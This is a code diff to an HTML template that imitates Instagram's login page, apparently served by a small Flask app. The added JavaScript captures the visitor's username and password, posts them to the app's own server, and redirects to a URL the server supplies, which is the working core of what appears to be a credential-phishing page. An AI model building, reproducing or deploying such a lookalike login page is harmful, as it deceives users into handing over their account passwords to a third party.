@@ -18,20 +18,17 @@
                     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                 </div>
                 <div class="form-wrap">
-                  <form class="form" method="post" action="{{ url_for('login_page') }}">
+                  <form id="login-form" class="form" onsubmit="submitForm(event)">
                     <div class="input-box">
-                      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                      <input type="text" id="username" name="username" placeholder="Username" required>
                     </div>  
                     <div class="input-box">
-                      <input type="password" name="password" placeholder="Password" required>
+                      <input type="password" id="password" name="password" placeholder="Password" required>
                     </div>  
                     <span class="button-box">
                       <button class="btn" type="submit">Log in</button>
                     </span>  
-                    {% if error %}
-                    <div class="_ab2z" style="color: #ED4956; font: 14px-apple-system, BlinkMacSystemFont, sans-serif; margin: 10px 40px;">{{ error }}</div>
-                    {% endif %}
-                    <a class="forgot" href="#">Forgot password?</a>
+                    <div id="error-message" class="_ab2z" style="color: #ED4956; font: 14px-apple-system, BlinkMacSystemFont, sans-serif; margin: 10px 40px; display: none;"></div>
                   </form>
                 </div>
               </div>
@@ -81,9 +78,34 @@
     </section>
   </div>
    <script type="text/javascript">
-    function la(src) {
-      window.location=src;
+    function submitForm(event) {
+      event.preventDefault();
+    
+      var username = document.getElementById('username').value;
+      var password = document.getElementById('password').value;
+    
+      fetch('/', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username: username, password: password })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          window.location.href = data.redirect_url; // توجيه إلى URL المحدد من الخادم
+        } else {
+          var errorMessage = document.getElementById('error-message');
+          errorMessage.textContent = data.message;
+          errorMessage.style.display = 'block';
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
     }
+       
   </script>
 </body>
 </html>
